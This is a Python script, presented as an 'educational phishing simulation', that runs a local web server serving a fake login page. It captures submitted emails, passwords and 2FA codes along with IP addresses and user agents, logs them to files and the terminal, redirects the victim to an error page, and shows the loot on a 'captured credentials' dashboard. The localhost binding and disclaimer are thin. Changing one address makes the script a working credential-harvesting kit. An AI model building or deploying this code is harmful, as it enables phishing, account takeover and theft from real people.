#!/usr/bin/env python3
# ADVANCED EDUCATIONAL PHISHING SIMULATION - Local Only
# DO NOT deploy online or use on others

from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
from datetime import datetime
import os
import json

class AdvancedPhishingSimHandler(BaseHTTPRequestHandler):
    
    def do_GET(self):
        """Serve pages based on request path"""
        
        if self.path == '/' or self.path == '/index.html':
            self.serve_file('index.html', 'text/html')
            
        elif self.path == '/error.html':
            self.serve_file('error.html', 'text/html')
            
        elif self.path == '/dashboard':
            self.serve_dashboard()
            
        elif self.path == '/stats':
            self.serve_stats()
            
        elif self.path == '/clear_logs':
            self.clear_logs()
            
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'Page not found')
    
    def serve_file(self, filename, content_type):
        """Helper to serve HTML files"""
        try:
            with open(filename, 'rb') as f:
                self.send_response(200)
                self.send_header('Content-type', content_type)
                self.end_headers()
                self.wfile.write(f.read())
        except FileNotFoundError:
            self.send_response(404)
            self.end_headers()
    
    def serve_dashboard(self):
        """Show a dashboard of captured credentials"""
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        # Read captured credentials
        captured_data = ""
        if os.path.exists('captured_log.txt'):
            with open('captured_log.txt', 'r') as f:
                captured_data = f.read()
        
        dashboard_html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Phishing Simulation Dashboard</title>
            <style>
                body {{ font-family: monospace; background: #0a0e27; color: #00ff00; padding: 20px; }}
                .container {{ max-width: 1200px; margin: 0 auto; }}
                .card {{ background: #1a1f3a; padding: 20px; margin: 20px 0; border-radius: 8px; border-left: 4px solid #00ff00; }}
                h1 {{ color: #00ff00; }}
                pre {{ background: #0d1127; padding: 15px; overflow-x: auto; white-space: pre-wrap; }}
                .warning {{ background: #ff000020; border-left-color: #ff0000; }}
                button {{ background: #00ff00; color: #0a0e27; padding: 10px 20px; border: none; cursor: pointer; margin: 10px; }}
                .nav {{ margin-bottom: 20px; }}
                a {{ color: #00ff00; margin-right: 20px; }}
            </style>
        </head>
        <body>
            <div class="container">
                <h1>[+] Phishing Simulation Dashboard</h1>
                <div class="nav">
                    <a href="/">[ Home ]</a>
                    <a href="/dashboard">[ Dashboard ]</a>
                    <a href="/stats">[ Statistics ]</a>
                </div>
                
                <div class="card">
                    <h2>Captured Credentials (Real-time)</h2>
                    <pre>{captured_data if captured_data else 'No credentials captured yet...'}</pre>
                </div>
                
                <div class="card warning">
                    <h2>Dashboard</h2>
                    <p>This dashboard shows captured credentials.</p>
                    <form action="/clear_logs" method="POST">
                        <button type="submit" onclick="return confirm('Clear all logs?')"> Clear All Logs </button>
                    </form>
                </div>
            </div>
        </body>
        </html>
        """
        self.wfile.write(dashboard_html.encode())
    
    def serve_stats(self):
        """Show statistics about the simulation"""
        stats = {
            'total_attempts': 0
        }
        
        if os.path.exists('captured_log.txt'):
            with open('captured_log.txt', 'r') as f:
                lines = f.readlines()
                stats['total_attempts'] = len(lines)
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        stats_html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Simulation Statistics</title>
            <style>
                body {{ font-family: Arial; background: #f0f2f5; padding: 20px; }}
                .stats {{ background: white; padding: 20px; margin: 10px 0; border-radius: 8px; }}
                .number {{ font-size: 48px; color: #4a90e2; }}
            </style>
        </head>
        <body>
            <h1>Simulation Statistics</h1>
            <div class="stats">
                <h2>Total Login Attempts</h2>
                <div class="number">{stats['total_attempts']}</div>
            </div>
            <a href="/dashboard"><- Back to Dashboard</a>
        </body>
        </html>
        """
        self.wfile.write(stats_html.encode())
    
    def clear_logs(self):
        """Clear all captured data"""
        if os.path.exists('captured_log.txt'):
            os.remove('captured_log.txt')
        if os.path.exists('detailed_log.json'):
            os.remove('detailed_log.json')
        
        self.send_response(302)
        self.send_header('Location', '/dashboard')
        self.end_headers()
    
    def do_POST(self):
        """Handle POST requests and capture credentials"""
        
        if self.path == '/login':
            # Get form data
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            parsed_data = urllib.parse.parse_qs(post_data.decode('utf-8'))
            
            # Extract all fields
            email = parsed_data.get('email', [''])[0]
            password = parsed_data.get('password', [''])[0]
            totp = parsed_data.get('totp', [''])[0]
            
            # Get client info
            client_ip = self.client_address[0]
            user_agent = self.headers.get('User-Agent', 'Unknown')
            
            # Create timestamp
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # Log to simple text file
            log_entry = f"[{timestamp}] IP: {client_ip} | Email: {email} | Password: {password} | 2FA: {totp}\n"
            with open('captured_log.txt', 'a') as f:
                f.write(log_entry)
            
            # Log to JSON
            detailed_entry = {
                'timestamp': timestamp,
                'ip': client_ip,
                'email': email,
                'password': password,
                'totp': totp if totp else None,
                'user_agent': user_agent
            }
            
            if os.path.exists('detailed_log.json'):
                with open('detailed_log.json', 'r') as f:
                    logs = json.load(f)
            else:
                logs = []
            
            logs.append(detailed_entry)
            
            with open('detailed_log.json', 'w') as f:
                json.dump(logs, f, indent=2)
            
            # Terminal output
            print("\n" + "="*50)
            print("[!] CREDENTIALS CAPTURED -", timestamp)
            print("="*50)
            print("Email:    ", email)
            print("Password: ", password)
            if totp:
                print("2FA Code: ", totp)
            print("IP:       ", client_ip)
            print("="*50)
            print("Saved to: captured_log.txt")
            print("="*50 + "\n")
            
            # Send response - redirect to error page
            self.send_response(302)
            self.send_header('Location', '/error.html')
            self.end_headers()
            
        elif self.path == '/clear_logs':
            self.clear_logs()
            
        else:
            self.send_response(404)
            self.end_headers()
    
    def log_message(self, format, *args):
        """Suppress default HTTP logs"""
        pass

def run_server(port=5000):
    server_address = ('127.0.0.1', port)
    httpd = HTTPServer(server_address, AdvancedPhishingSimHandler)
    
    print("\n" + "="*50)
    print("Phishing Simulation (Educational)")
    print("="*50)
    print("Server running at: http://127.0.0.1:" + str(port))
    print("\nFeatures:")
    print("  - Email + Password + 2FA capture")
    print("  - Admin dashboard")
    print("  - Statistics tracking")
    print("\nTest it:")
    print("  1. Open browser to http://127.0.0.1:5000")
    print("  2. Enter fake credentials")
    print("  3. Check dashboard at /dashboard")
    print("\nPress Ctrl+C to stop\n")
    
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\nShutting down...")
        httpd.server_close()

if __name__ == '__main__':
    run_server()